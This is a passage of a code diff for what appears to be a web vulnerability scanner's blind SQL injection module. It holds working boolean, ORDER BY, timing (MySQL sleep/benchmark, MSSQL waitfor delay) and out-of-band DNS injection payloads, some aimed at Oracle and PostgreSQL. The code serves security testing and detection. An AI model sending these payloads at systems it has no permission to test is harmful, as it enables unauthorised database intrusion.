+	paramValue = origValue + quoteChar + " OR 2+1-1-1=1 AND " + randString + "=" + randString + " or " + quoteChar + randStrLong + quoteChar + "=" + quoteChar;
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody != trueBody) {
+    	if (debug) {
+    		trace("failed complex test 1");
+        		trace(testBody);
+        		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, true);
+	// test FALSE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR " + randString + "=" + randString + " AND 3+1-1-1=1 or " + quoteChar + randStrLong + quoteChar + "=" + quoteChar;
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == trueBody) {
+    	if (debug) {
+    		trace("failed complex test 2");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test FALSE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2=5 AND " + randString + "=" + randString + " or " + quoteChar + randStrLong + quoteChar + "=" + quoteChar;
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == trueBody) {
+    	if (debug) {
+    		trace("failed complex test 3");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test TRUE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2=6 AND " + randString + "=" + randString + " or " + quoteChar + randStrLong + quoteChar + "=" + quoteChar;
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody != trueBody) {
+    	if (debug) {
+    		trace("failed complex test 4");
+    		trace(testBody);
+    		trace(trueBody);
+		}    		
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, true);
+	// test FALSE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2*0=6 AND " + randString + "=" + randString + " or " + quoteChar + randStrLong + quoteChar + "=" + quoteChar;
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == trueBody) {
+    	if (debug) {
+    		trace("failed complex test 5");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test TRUE  -------------------------------------------------------------
+	paramValue = origValue + quoteChar + " OR 3*2*1=6 AND " + randString + "=" + randString + " or " + quoteChar + randStrLong + quoteChar + "=" + quoteChar;
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody != trueBody) {
+    	if (debug) {
+    		trace("failed complex test 6");
+    		trace(testBody);
+    		trace(trueBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, true);
+	return paramValue;
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.testInjection = function(varIndex, quoteChar, likeInjection)
+{   
+    variation = this.variations.item(varIndex);
+    var confirmed = false; 
+    // the confirmInjection return the latest value that was tested (should be true)
+    var confirmResult = false;
+    
+    while (true)
+    {
+    	confirmResult = this.confirmInjection(varIndex, quoteChar, likeInjection, confirmed); 
+    	if (!confirmResult) return false;
+    	
+        if (confirmed) {
+        	if (debug) trace("second round finished with success");
+        	break;
+        }        
+        else {
+        	if (debug) trace("first round finished with success");
+        	confirmed = true;
+        }
+    }   
+    
+    // report sql injection
+    this.alert(confirmResult);
+    
+    // delete confirm injection history
+    this.confirmInjectionHistory = false; 
+    return true;
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.testInjectionWithOR = function(varIndex, quoteChar, dontCommentRestOfQuery)
+{   
+    variation = this.variations.item(varIndex);
+    var confirmed = false; 
+    // the confirmInjection return the latest value that was tested (should be true)
+    var confirmResult = false;
+    
+    while (true)
+    {
+    	confirmResult = this.confirmInjectionWithOR(varIndex, quoteChar, confirmed, dontCommentRestOfQuery); 
+    	if (!confirmResult) return false;
+    	
+        if (confirmed) {
+        	if (debug) trace("second round finished with success");
+        	break;
+        }        
+        else {
+        	if (debug) trace("first round finished with success");
+        	confirmed = true;
+        }
+    }   
+    
+    // report sql injection
+    this.alert(confirmResult);
+    
+    // delete confirm injection history
+    this.confirmInjectionHistory = false; 
+    return true;
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.testInjectionWithOR2 = function(varIndex, quoteChar)
+{   
+    variation = this.variations.item(varIndex);
+    var confirmed = false; 
+    // the confirmInjection return the latest value that was tested (should be true)
+    var confirmResult = false;
+    
+    while (true)
+    {
+    	confirmResult = this.confirmInjectionWithOR2(varIndex, quoteChar, confirmed); 
+    	if (!confirmResult) return false;
+    	
+        if (confirmed) {
+        	if (debug) trace("second round finished with success");
+        	break;
+        }        
+        else {
+        	if (debug) trace("first round finished with success");
+        	confirmed = true;
+        }
+    }   
+    
+    // report sql injection
+    this.alert(confirmResult);
+    
+    // delete confirm injection history
+    this.confirmInjectionHistory = false; 
+    return true;
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.confirmInjectionOrderBy = function(varIndex, confirmed)
+{   
+	if (debug) trace("confirmInjectionOrderBy " + varIndex + ", " + confirmed);
+	
+	// load scheme variation
+	variation = this.variations.item(varIndex);
+	// original value
+	var origValue = this.origValue;
+	// the body that gets returned during testing
+	var testBody = "";
+	// the parameter value to be returned if success
+	var paramValue = false;	
+	// a variable containing all the tests that were performed
+	this.confirmInjectionHistory = false;
+	
+	// random integer < 1000
+	var randNum = 10+(Math.floor(Math.random()*989));
+	
+	// random string	
+	var randString = randNum;
+	if (confirmed) randString = '000' + randString;
+	
+	var equalitySign = "=";
+	
+	var baseline = "1,(select case when (${comparison}) then 1 else 1*(select table_name from information_schema.tables)end)=1";
+	// BASELINE  -------------------------------------------------------------
+	paramValue = baseline.replace("${comparison}" , randString + equalitySign + randString);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    origBody = this.filterBody(this.lastJob.response.body, paramValue);
+	// test TRUE  -------------------------------------------------------------
+	paramValue = baseline.replace("${comparison}" , "2+1-1-1=0+0+0+1");
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody != origBody) {
+    	if (debug) {
+    		trace("failed string test 1");
+    		trace(testBody);
+    		trace(origBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, true);
+	// test FALSE  -------------------------------------------------------------
+	paramValue = baseline.replace("${comparison}" , "3+1-1-1=0+0+0+1");
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == origBody) {
+    	if (debug) {
+    		trace("failed string test 2");
+    		trace(testBody);
+    		trace(origBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test FALSE  -------------------------------------------------------------
+	paramValue = baseline.replace("${comparison}" , "3*2<(0+5+0+0)");
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == origBody) {
+    	if (debug) {
+    		trace("failed string test 3");
+    		trace(testBody);
+    		trace(origBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test TRUE  -------------------------------------------------------------
+	paramValue = baseline.replace("${comparison}" , "3*2>(0+5+0+0)");
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody != origBody) {
+    	if (debug) {
+    		trace("failed string test 4");
+    		trace(testBody);
+    		trace(origBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, true);
+	
+	// test TRUE  -------------------------------------------------------------
+	paramValue = baseline.replace("${comparison}" , "2+1-1-1=1");
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody != origBody) {
+    	if (debug) {
+    		trace("failed common test 1");
+        		trace(testBody);
+        		trace(origBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, true);
+	// test FALSE  -------------------------------------------------------------
+	paramValue = baseline.replace("${comparison}" , "3+1-1-1=1");
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == origBody) {
+    	if (debug) {
+    		trace("failed common test 2");
+    		trace(testBody);
+    		trace(origBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test FALSE  -------------------------------------------------------------
+	paramValue = baseline.replace("${comparison}" , "3*2=5 AND " + randString + equalitySign + randString);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == origBody) {
+    	if (debug) {
+    		trace("failed common test 3");
+    		trace(testBody);
+    		trace(origBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test TRUE  -------------------------------------------------------------
+	paramValue = baseline.replace("${comparison}" , "3*2=6 AND " + randString + equalitySign + randString);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody != origBody) {
+    	if (debug) {
+    		trace("failed common test 4");
+    		trace(testBody);
+    		trace(origBody);
+		}    		
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, true);
+	// test FALSE  -------------------------------------------------------------
+	paramValue = baseline.replace("${comparison}" , "3*2*0=6 AND " + randString + equalitySign + randString);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody == origBody) {
+    	if (debug) {
+    		trace("failed common test 5");
+    		trace(testBody);
+    		trace(origBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, false);
+	// test TRUE  -------------------------------------------------------------
+	paramValue = baseline.replace("${comparison}" , "3*2*1=6 AND " + randString + equalitySign + randString);
+	if (debug) {trace(paramValue);}
+    if (!this.request(variation, paramValue)) return false;
+    testBody = this.filterBody(this.lastJob.response.body, paramValue);
+    if (testBody != origBody) {
+    	if (debug) {
+    		trace("failed common test 6");
+    		trace(testBody);
+    		trace(origBody);
+    	}
+    	return false;
+    }
+    this.addToConfirmInjectionHistory(paramValue, true);
+	return paramValue;
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.testInjectionOrderBy = function(varIndex)
+{   
+	//debug = true;
+	
+    variation = this.variations.item(varIndex);
+    var confirmed = false; 
+    // the confirmInjection return the latest value that was tested (should be true)
+    var confirmResult = false;
+    
+    while (true)
+    {
+    	confirmResult = this.confirmInjectionOrderBy(varIndex, confirmed); 
+    	if (!confirmResult) {
+    		// not confirmed, exit
+			// debug = false;
+    		return false;
+    	}
+    	
+        if (confirmed) {
+        	if (debug) trace("second round finished with success");
+        	break;
+        }        
+        else {
+        	if (debug) trace("first round finished with success");
+        	confirmed = true;
+        }
+    }   
+    
+    // report sql injection
+    this.alert(confirmResult);
+    
+    // delete confirm injection history
+    this.confirmInjectionHistory = false; 
+    return true;
+}
+/**************************************************************************************************************/
+/* timing tests */
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.genSleepString = function(sleepType)
+{
+	// sleep expressed in seconds
+	if (sleepType == 'long') return this.longDuration.toString();
+	else if (sleepType == 'verylong') return (this.shortDuration+this.longDuration).toString();
+	else if (sleepType == 'mid') return this.shortDuration.toString();
+	else if (sleepType == '2xmid') return (this.shortDuration*2+1).toString();
+	else if (sleepType == 'none') return "0";
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.genBenchmarkSleepString = function(sleepType)
+{
+    // sleep expressed in benchmark iterations
+    if (sleepType == 'long') return "4000000";
+    else if (sleepType == 'verylong') return "5000000";
+    else if (sleepType == 'mid') return "1000000";
+    else if (sleepType == '2xmid') return "2500000";
+    else if (sleepType == 'none') return "1";
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.testTiming = function(varIndex, paramValue, dontEncode)
+{   
+	// load scheme variation
+    variation = this.variations.item(varIndex);
+    
+    this.confirmInjectionHistory = false;
+    
+    var origParamValue = paramValue;
+    var confirmed = false;
+    
+    var Time1 = 0;	// long  		(4)
+    var Time2 = 0;	// no 			(0)
+    var Time3 = 0;	// mid 			(3)
+    var Time4 = 0;	// very long 	(6)
+    
+    var timeOutSecs = 20;
+    
+    var zeroTimeOut = this.shortDuration - 1;
+    if (zeroTimeOut > 3) zeroTimeOut = 3;
+    
+    var timeOutCounter = 0;
+    
+    this.stepLongDelay = function () {
+        // long sleep        
+        paramValue = origParamValue.replace(/{SLEEP}/g, this.genSleepString("long"));
+        paramValue = paramValue.replace(/{ORIGVALUE}/g, this.origValue);        
+        paramValue = paramValue.replace(/{RANDSTR}/g, randStr(8)); 
+        if (debug) trace("paramValue: " + paramValue);
+        
+        if (!this.request(variation, paramValue, timeOutSecs*1000, dontEncode)) return false;
+        Time1 = this.lastJob.responseDuration/1000;
+        this.addToConfirmInjectionHistoryTiming(paramValue, Time1);        
+        if (debug) trace("Time1: " + Time1);
+        if (Time1 < (this.longDuration * 99/100)) return false;    	
+        
+        return true;
+    }
+    
+    this.stepZeroDelay = function () {
+        // no sleep
+        paramValue = origParamValue.replace(/{SLEEP}/g, this.genSleepString("none"));
+        paramValue = paramValue.replace(/{ORIGVALUE}/g, this.origValue);
+        paramValue = paramValue.replace(/{RANDSTR}/g, randStr(8)); 
+        if (debug) trace("paramValue: " + paramValue);
+        if (!this.request(variation, paramValue, timeOutSecs*1000, dontEncode)) return false;
+        Time2 = this.lastJob.responseDuration/1000;
+        this.addToConfirmInjectionHistoryTiming(paramValue, Time2);
+        if (debug) trace("Time2: " + Time2);
+        if (this.lastJob.wasError && this.lastJob.errorCode == 0xF0003) timeOutCounter++;
+        if (Time2 > zeroTimeOut) return false; 
+        
+        return true;
+    }
+    
+    this.stepMidDelay = function () {
+        // middle sleep
+        paramValue = origParamValue.replace(/{SLEEP}/g, this.genSleepString("mid"));
+        paramValue = paramValue.replace(/{ORIGVALUE}/g, this.origValue);
+        paramValue = paramValue.replace(/{RANDSTR}/g, randStr(8)); 
+        if (debug) trace("paramValue: " + paramValue);
+                
+        if (!this.request(variation, paramValue, timeOutSecs*1000, dontEncode)) return false;
+        Time3 = this.lastJob.responseDuration/1000;
+        this.addToConfirmInjectionHistoryTiming(paramValue, Time3);
+        if (debug) trace("Time3: " + Time3);
+        
+        if (Time3 < (this.shortDuration * 99/100)) return false;         
+       
+        return true;
+	}
+	
+    this.stepVeryLongDelay = function () {
+        // very long sleep        
+        var veryLongDuration = (this.shortDuration + this.longDuration);
+        
+        paramValue = origParamValue.replace(/{SLEEP}/g, this.genSleepString("verylong"));
+        paramValue = paramValue.replace(/{ORIGVALUE}/g, this.origValue);        
+        paramValue = paramValue.replace(/{RANDSTR}/g, randStr(8)); 
+        if (debug) trace("paramValue: " + paramValue);
+        
+        if (!this.request(variation, paramValue, timeOutSecs*1000, dontEncode)) return false;
+        Time4 = this.lastJob.responseDuration/1000;
+        this.addToConfirmInjectionHistoryTiming(paramValue, Time4);
+        if (debug) trace("Time4: " + Time4);
+        if (Time4 < (veryLongDuration * 99/100)) return false;
+        
+        return true;
+    }
+	var permutations = new Array("lzvm", "lzmv", "lvzm", "lvmz", "lmzv", "lmvz", "vzlm", "vzml", "vlzm", "vlmz", "vmzl", "vmlz", "mzlv", "mzvl", "mlzv", "mlvz", "mvzl", "mvlz");
+	
+    var permIndex = getSequence() % permutations.length;
+    var permutation = permutations[permIndex] + "zzzlz";
+    
+    if (debug) 
+    	trace("permutation: " + permutation);
+	// run through permutations	
+	for (var i=0;i<permutation.length;i++) {
+		perm = permutation.charAt(i);
+		if (perm == 'z') {
+			if (!this.stepZeroDelay()) return false; 
+		} 
+		else if (perm == 'l') {
+			if (!this.stepLongDelay()) return false; 
+		} 
+		else if (perm == 'v') {
+			if (!this.stepVeryLongDelay()) return false; 
+		} 
+		else if (perm == 'm') {
+			if (!this.stepMidDelay()) return false; 
+		} 
+	}
+    
+/*    
+    var Time1 => // long  		(4)
+    var Time2 => // no 			(0)
+    var Time3 => // mid 		(3)
+    var Time4 => // very long 	(6)    
+*/
+    
+    // if the timings don't match stop 
+    if (Time3 > Time4 || Time3 > Time1 || Time2 > Time4 || Time2 > Time1) return false; 
+    
+    // if the timings don't match stop (more checks)
+    if (Time3>=Time1) return false;
+    if (Time1>=Time4) return false;
+    // if at least one of the zero sleep does timeout mark it as a false positive
+    if (timeOutCounter>0) return false; 
+    
+    // report sql injection       
+    this.alert(paramValue);    
+    
+    this.confirmInjectionHistory = false; 
+    
+    return true;
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.testBenchmarkTiming = function(varIndex, paramValue, dontEncode)
+{
+    // load scheme variation
+    variation = this.variations.item(varIndex);
+    this.confirmInjectionHistory = false;
+    var origParamValue = paramValue;
+    var confirmed = false;
+    var Time1 = 0;	// long  		(4)
+    var Time2 = 0;	// no 			(0)
+    var Time3 = 0;	// mid 			(3)
+    var Time4 = 0;	// very long 	(6)
+    var timeOutSecs = 30;
+    var zeroTimeOut = this.shortDuration - 1;
+    if (zeroTimeOut > 3) zeroTimeOut = 3;
+    var timeOutCounter = 0;
+    this.stepLongDelay = function () {
+        // long sleep
+        paramValue = origParamValue.replace(/{BSLEEP}/g, this.genBenchmarkSleepString("long"));
+        paramValue = paramValue.replace(/{ORIGVALUE}/g, this.origValue);
+        paramValue = paramValue.replace(/{RANDSTR}/g, randStr(8));
+        if (debug) trace("paramValue: " + paramValue);
+        if (!this.request(variation, paramValue, timeOutSecs*1000, dontEncode)) return false;
+        Time1 = this.lastJob.responseDuration/1000;
+        this.addToConfirmInjectionHistoryTiming(paramValue, Time1);
+        if (debug) trace("Time1: " + Time1);
+        if (Time1 < 6) return false;
+        return true;
+    }
+    this.stepZeroDelay = function () {
+        // no sleep
+        paramValue = origParamValue.replace(/{BSLEEP}/g, this.genBenchmarkSleepString("none"));
+        paramValue = paramValue.replace(/{ORIGVALUE}/g, this.origValue);
+        paramValue = paramValue.replace(/{RANDSTR}/g, randStr(8));
+        if (debug) trace("paramValue: " + paramValue);
+        if (!this.request(variation, paramValue, timeOutSecs*1000, dontEncode)) return false;
+        Time2 = this.lastJob.responseDuration/1000;
+        this.addToConfirmInjectionHistoryTiming(paramValue, Time2);
+        if (debug) trace("Time2: " + Time2);
+        if (this.lastJob.wasError && this.lastJob.errorCode == 0xF0003) timeOutCounter++;
+        if (Time2 > 2) return false;
+        return true;
+    }
+    this.stepMidDelay = function () {
+        // middle sleep
+        paramValue = origParamValue.replace(/{BSLEEP}/g, this.genBenchmarkSleepString("mid"));
+        paramValue = paramValue.replace(/{ORIGVALUE}/g, this.origValue);
+        paramValue = paramValue.replace(/{RANDSTR}/g, randStr(8));
+        if (debug) trace("paramValue: " + paramValue);
+        if (!this.request(variation, paramValue, timeOutSecs*1000, dontEncode)) return false;
+        Time3 = this.lastJob.responseDuration/1000;
+        this.addToConfirmInjectionHistoryTiming(paramValue, Time3);
+        if (debug) trace("Time3: " + Time3);
+        return true;
+    }
+    this.stepVeryLongDelay = function () {
+        // very long sleep
+        var veryLongDuration = (this.shortDuration + this.longDuration);
+        paramValue = origParamValue.replace(/{BSLEEP}/g, this.genBenchmarkSleepString("verylong"));
+        paramValue = paramValue.replace(/{ORIGVALUE}/g, this.origValue);
+        paramValue = paramValue.replace(/{RANDSTR}/g, randStr(8));
+        if (debug) trace("paramValue: " + paramValue);
+        if (!this.request(variation, paramValue, timeOutSecs*1000, dontEncode)) return false;
+        Time4 = this.lastJob.responseDuration/1000;
+        this.addToConfirmInjectionHistoryTiming(paramValue, Time4);
+        if (debug) trace("Time4: " + Time4);
+        if (Time4 < 8) return false;
+        return true;
+    }
+    var permutations = new Array("lzvm", "lzmv", "lvzm", "lvmz", "lmzv", "lmvz", "vzlm", "vzml", "vlzm", "vlmz", "vmzl", "vmlz", "mzlv", "mzvl", "mlzv", "mlvz", "mvzl", "mvlz");
+    var permIndex = getSequence() % permutations.length;
+    var permutation = permutations[permIndex] + "zzzlz";
+    if (debug)
+        trace("permutation: " + permutation);
+    // run through permutations
+    for (var i=0;i<permutation.length;i++) {
+        perm = permutation.charAt(i);
+        if (perm == 'z') {
+            if (!this.stepZeroDelay()) return false;
+        }
+        else if (perm == 'l') {
+            if (!this.stepLongDelay()) return false;
+        }
+        else if (perm == 'v') {
+            if (!this.stepVeryLongDelay()) return false;
+        }
+        else if (perm == 'm') {
+            if (!this.stepMidDelay()) return false;
+        }
+    }
+    /*
+     var Time1 => // long  		(4)
+     var Time2 => // no 			(0)
+     var Time3 => // mid 		(3)
+     var Time4 => // very long 	(6)
+     */
+    // if the timings don't match stop
+    if (Time3 > Time4 || Time3 > Time1 || Time2 > Time4 || Time2 > Time1) return false;
+    // if the timings don't match stop (more checks)
+    if (Time3>=Time1) return false;
+    if (Time1>=Time4) return false;
+    // if at least one of the zero sleep does timeout mark it as a false positive
+    if (timeOutCounter>0) return false;
+    // report sql injection
+    this.alert(paramValue);
+    this.confirmInjectionHistory = false;
+    return true;
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.testOOB = function(varIndex, paramValue, userData)
+{
+    if(bxss_enabled == 1 && bxss_userId && bxss_url){
+        var reqId = saveTest(this.inputIndex, this.variations.item(this.currentVariation), userData);
+        if (reqId) {
+            var reqIdParts = reqId.split("-");
+            var reqScanId = reqIdParts[0];
+            var reqHash = plain2md5(this.scheme.path + this.scheme.hash + reqScanId).substring(1,6);
+            var domain = "dns.sqli." + bxss_userId + "." + reqId + "." + reqScanId + "." + reqHash + ".1.bxss.me";
+            // for Oracle, use string concatenation to prevent false positive
+			if (paramValue.indexOf("UTL_INADDR.get_host_address") != -1) {
+                domain = domain.replace("dns.sqli.", "dns.'||'sqli.").replace("1.bxss.me", "1.bxss'||'.me");
+            }
+            // for PostgreSQL, use escaping to prevent false positives
+            if (paramValue.indexOf("copy (select '') to program") != -1) {
+                domain = domain.replace(".1.bxss.me", ".\\1.bxss.me").replace(bxss_userId, "\\" + bxss_userId);
+            }
+            if (debug) trace("testOOB: variation " + varIndex);
+            if (debug) trace("testOOB: domain " + domain);
+            var origParamValue = paramValue;
+            // load scheme variation
+            var variation = this.variations.item(varIndex);
+            paramValue = origParamValue.replace(/{DOMAIN}/g, domain);
+            paramValue = paramValue.replace(/{ORIGVALUE}/g, this.origValue);
+            if (debug) trace("paramValue: " + paramValue);
+            this.request(variation, paramValue);
+        }
+    }
+}
+/**************************************************************************************************************/
+classBlindSQLInj.prototype.startTesting = function()
+{   
+    // if we don't have an original value, default to some value
+    if (this.origValue == "") 
+    {   
+        this.origValue = "1";
+        this.isNumeric = true;
+    }
+    for (var i=0; i<this.variations.count; i++) 
+    {
+        // don't test further variations
+		if (this.foundVulnOnVariation) break;
+    	
+        // check if the response is stable
+        // also save the body to this.origBody
+        if (!this.checkIfResponseIsStable(i)) return false;
+        // tests to perform
+        var doBooleanTests = true;
+        var doTimingTests = true;
+        var doTimingTestsMySQL = true;
+        var doTimingTestsMySQLBenchmark = false;
+        var doTimingTestsMSSQL = true;
+        var doTimingTestsMSSQLExtra = false;
+        var doTimingTestsPostgreSQL = true;
+        var doTimingTestsPostgreSQLExtra = false;
+        var doTimingTestsRails = true;
+        var doOOBTests = true;
+        // for bounties do more tests even if they have false positives
+        if (bounties) {
+            var doBooleanTests = true;
+            var doTimingTests = true;
+            var doTimingTestsMySQL = true;
+            var doTimingTestsMySQLBenchmark = true;
+            var doTimingTestsMSSQL = true;
+            var doTimingTestsMSSQLExtra = true;
+            var doTimingTestsPostgreSQL = true;
+            var doTimingTestsPostgreSQLExtra = true;
+            var doTimingTestsRails = true;
+            var doOOBTests = true;
+        }
+        
+	    if (debug) {
+	    	trace('this.origValue:' + this.origValue);
+	    	trace('this.shortDuration:' + this.shortDuration);
+	     	trace('this.longDuration:' + this.longDuration);     
+	     	trace('this.isNumeric:' + this.isNumeric);				
+	     	trace('this.responseIsStable:' + this.responseIsStable);				
+	     	trace('this.inputIsStable:' + this.inputIsStable);				
+	     	trace('this.responseTimingIsStable:' + this.responseTimingIsStable);		
+	 	}
+        if (doBooleanTests) {
+            // boolean tests
+            if (this.inputIsStable) {
+                // numeric
+                if (this.isNumeric && this.testInjection(i, '', false)) return true;
+                // single quote
+                if (this.testInjection(i, "'", false)) return true;
+                // double quote
+                if (this.testInjection(i, '"', false)) return true;
+                // single quote, inside like
+                if (this.testInjection(i, "'", true)) return true;
+                // for special named parameters make do the order/group by tests
+                if ((this.inputNameLC.indexOf("order") != -1 || this.inputNameLC.indexOf("group") != -1 || this.inputNameLC.indexOf("sort") != -1)
+                    && this.testInjectionOrderBy(i)) return true;
+            }
+            else
+            // these tests are run if the input is not stable (that means that is possible to have an incorrect value as parameter)
+            // here we have to use the OR tests
+            {
+                // no quotes
+                if (this.testInjectionWithOR(i, '')) return true;
+                // no quotes (don't comment rest of query)
+                if (this.testInjectionWithOR(i, '', true)) return true;
+                // single quote
+                if (this.testInjectionWithOR(i, "'")) return true;
+                // single quote (variant)
+                if (this.testInjectionWithOR2(i, "'")) return true;
+                // double quote
+                if (this.testInjectionWithOR(i, '"')) return true;
+            }
+        }
+        // timing tests
+        if (doTimingTests) {
+            if (this.responseTimingIsStable) {
+                if (doTimingTestsMySQL) {
+                    if (debug) trace("doTimingTestsMySQL");
+                    // timing tests (MySQL)
+                    // mysql generic test
+                    if (this.testTiming(i, "if(now()=sysdate(),sleep({SLEEP}),0)/*'XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR'\"XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR\"*/")) return true;
+                    // mysql generic variant
+                    if (this.testTiming(i, "(select(0)from(select(sleep({SLEEP})))v)/*'+(select(0)from(select(sleep({SLEEP})))v)+'\"+(select(0)from(select(sleep({SLEEP})))v)+\"*/")) return true;
+                    if (doTimingTestsMySQLBenchmark) {
+                        if (debug) trace("doTimingTestsMySQLBenchmark");
+                        // generic tests using benchmark
+                        if (this.testBenchmarkTiming(i, "if(now()=sysdate(),(select(0)from(select(benchmark({BSLEEP},MD5(1))))v),0)/*'XOR(if(now()=sysdate(),(select(0)from(select(benchmark({BSLEEP},MD5(1))))v),0))OR'\"XOR(if(now()=sysdate(),(select(0)from(select(benchmark({BSLEEP},MD5(1))))v),0))OR\"*/")) return true;
+                        if (this.testBenchmarkTiming(i, "(select(0)from(select(benchmark({BSLEEP},MD5(1))))v)/*'+(select(0)from(select(benchmark({BSLEEP},MD5(1))))v)+'\"+(select(0)from(select(benchmark({BSLEEP},MD5(1))))v)+\"*/")) return true;
+                    }
+                    // the perl jam
+                    if (this.scheme.path) {
+                        var schemeInputType = this.scheme.getInputTypeStr(this.inputIndex);
+                        // only test on GET and POST
+                        if (schemeInputType == 'URL encoded GET' || schemeInputType == 'URL encoded POST') {
+                            var pathExtension = getFileExt(this.scheme.path);
+                            // for perl and cgi try some particular exploit (the perl jam)
+                            if (pathExtension && (pathExtension == "cgi" || pathExtension == "pl")) {
+                                var paramName = this.scheme.getInputName(this.inputIndex);
+                                if (this.testTiming(i, "(select(0)from(select(sleep({SLEEP})))v)/*'+(select(0)from(select(sleep({SLEEP})))v)+'\"+(select(0)from(select(sleep({SLEEP})))v)+\"*/" + "&" + paramName + "=2", true)) return true;
+                            }
+                        }
+                    }
+                }
+                if (doTimingTestsMSSQL) {
+                    // timing tests (MSSQL)
+                    // no quote
+                    if (this.isNumeric && this.testTiming(i, "-1; waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                    // no quote, one parentheses
+                    if (this.isNumeric && this.testTiming(i, "-1); waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                    // no quote, two parentheses
+                    if (isWindows || isIIS || doTimingTestsMSSQLExtra )
+                        if (this.isNumeric && this.testTiming(i, "-1)); waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                    // no quote, variant, no ;
+                    if (this.testTiming(i, "1 waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                    // single quote
+                    if (this.testTiming(i, "{RANDSTR}'; waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                    // single quote, one parentheses
+                    if (isWindows || isIIS || doTimingTestsMSSQLExtra)
+                        if (this.testTiming(i, "{RANDSTR}'); waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                    // single quote, two parentheses
+                    if (isWindows || isIIS || doTimingTestsMSSQLExtra)
+                        if (this.testTiming(i, "{RANDSTR}')); waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                    // extra tests
+                    if (doTimingTestsMSSQLExtra) {
+                        if (this.testTiming(i, "); waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                        if (this.testTiming(i, "\"; waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                        if (this.testTiming(i, "'; waitfor delay '0:0:{SLEEP}' -- ")) return true;
+                        if (this.testTiming(i, "'); waitfor delay '0:0:{SLEEP}' -- ")) return true;
